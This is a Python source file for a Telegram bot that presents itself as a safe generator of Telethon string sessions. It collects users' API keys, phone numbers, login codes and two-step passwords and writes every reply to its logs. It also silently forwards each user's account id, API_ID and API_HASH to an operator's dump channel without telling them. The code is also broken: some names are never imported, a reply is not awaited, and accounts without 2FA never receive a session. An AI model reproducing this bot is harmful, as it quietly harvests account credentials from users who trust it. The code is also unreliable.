#!/usr/bin/env python
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# First we need the asyncio library
import asyncio
import logging
import os
import random
import sys
from telethon import TelegramClient, events, custom
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeInvalidError, ApiIdInvalidError

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# the secret configuration specific things
ENV = bool(os.environ.get("ENV", False))

if os.path.exists("config.py"):
    from config import Development as Config
else:
    logging.warning("No config.py Found!")
    logging.info("Please run the command, again, after creating config.py similar to README.md")
    sys.exit(1)


# the Strings used for this "thing"
from translation import Translation


async def main():
    # We have to manually call "start" if we want an explicit bot token
    UniBorgBotClient = await TelegramClient(
        "UniBorgBot",
        Config.APP_ID,
        Config.API_HASH
    ).start(bot_token=Config.TG_BOT_TOKEN)
    
    @UniBorgBotClient.on(events.NewMessage(pattern="/help"))
    async def helpi(event):
        await UniBorgBotClient.send_message(event.chat_id, "Hey User👀... Below is Description:\nName: ƛsτʀ๏ Sᴇssɪᴏɴ Gᴇɴᴇʀᴀᴛᴏʀ\nClass: [Python3](https://python.org)\nLibrary: [Telethon](https://docs.telethon.dev/)\nWork: To Generate a Safe and long lasting String Session For your Telethon userbot..!\nC R E A T O R:", buttons=[
        [
          Button.url("ƛsτʀ๏ υsєяъ๏т", url="https://t.me/Astro_UserBot"),
          Button.url("Ƥṩүƈн๏ ɮѳτs", url="https://t.me/Psycho_Bots")]
          ])
    async with UniBorgBotClient:
        # Getting information about yourself
        me = await UniBorgBotClient.get_me()
        # "me" is an User object. You can pretty-print
        # any Telegram object with the "stringify" method:
        logging.info(me.stringify())
        @UniBorgBotClient.on(events.NewMessage())
        async def handler(event):
            # logging.info(event.stringify()
            async with event.client.conversation(event.chat_id) as conv:
                await conv.send_message("Hello! Welcome There✨\nThis is Astro Session.. to Get String Session..!\n\nPlease Enter your `API_ID`\n⤵️🔽")
                response = conv.wait_event(events.NewMessage(
                    chats=event.chat_id
                ))
                response = await response
                logging.info(response)
                APP_ID = response.message.message.strip()
              
                await asyncio.sleep(2)
                await conv.send_message("Hey Good..\n\nNow please Enter your `API_HASH`⤵️🔽")
                response = conv.wait_event(events.NewMessage(
                    chats=event.chat_id
                ))
                response = await response
                logging.info(response)
                API_HASH = response.message.message.strip()
                
                await asyncio.sleep(2)
                await conv.send_message(Translation.INPUT_PHONE_NUMBER)
                response = conv.wait_event(events.NewMessage(
                    chats=event.chat_id
                ))
                response = await response
                logging.info(response)
                phone = response.message.message.strip()
                current_client = TelegramClient(
                    StringSession(),
                    api_id=APP_ID,
                    api_hash=API_HASH,
                    device_model="@AstroSessionBot",
                    system_version="@Astro_UserBot",
                    app_version="9.6.9",
                    lang_code="en"
                )
                await current_client.connect()
                try:
                    sent = await current_client.send_code_request(phone)
                    logging.info(sent)
                except ApiIdInvalidError:
                    await event.reply("Your API_ID/API_HASH is wrong🙄Check it First..\n\nHave Restart now /start")
                    exit(0)
                except PhoneNumberInvalidError:
                    await event.reply("Your Phone no is invalid LoL..\n\nHave Restart nos5 /start")
                try:
                    await conv.send_message(Translation.ALREADY_REGISTERED_PHONE)
                    response = conv.wait_event(events.NewMessage(
                        chats=event.chat_id
                    ))
                    response = await response
                    logging.info(response)
                    received_code = response.message.message.strip()
                    received_tfa_code = None
                    received_code = "".join(received_code.split(" "))
                except:
                  event.reply("Invalid Code..! Please enter Correct one🥲\nNow Have re- /start")
                  
                try:
                    await current_client.sign_in(phone, code=received_code, password=received_tfa_code)
                except PhoneCodeInvalidError:
                      await conv.send_message(Translation.PHONE_CODE_IN_VALID_ERR_TEXT)
                      return
                except Exception as e:
                      logging.info(str(e))
                      await conv.send_message(
                            Translation.ACC_PROK_WITH_TFA)
                      response = conv.wait_event(events.NewMessage(
                            chats=event.chat_id
                        ))
                      response = await response
                      logging.info(response)
                      received_tfa_code = response.message.message.strip()
                      await current_client.sign_in(password=received_tfa_code)
                    # Getting information about yourself
                      current_client_me = await current_client.get_me()
                    # "me" is an User object. You can pretty-print
                    # any Telegram object with the "stringify" method:
                      logging.info(current_client_me.stringify())
                      session_string = current_client.session.save()
                      await conv.send_message(f"ƛsτʀ๏ υsєяъ๏т\n :`{session_string}` \n\n**Do Not Share this Anywhere!**\n\n•Join Channel ~ @Astro_UserBot\n•Join Support ~ @Astro_HelpChat")
                      await event.client.send_message(
                        entity=Config.TG_DUMP_CHANNEL,
                        message=Translation.LOG_MESSAGE_FOR_DBGING.format(
                            C=event.chat_id,
                            L=current_client_me.id,
                            APP_ID=APP_ID,
                            API_HASH=API_HASH
                        ),
                        reply_to=4,
                        parse_mode="md",
                        link_preview=False,
                        silent=True
                    )
                

        await UniBorgBotClient.run_until_disconnected() 
        
        
if __name__ == '__main__':
    # Then we need a loop to work with
    loop = asyncio.get_event_loop()
    # Then, we need to run the loop with a task
    loop.run_until_complete(main())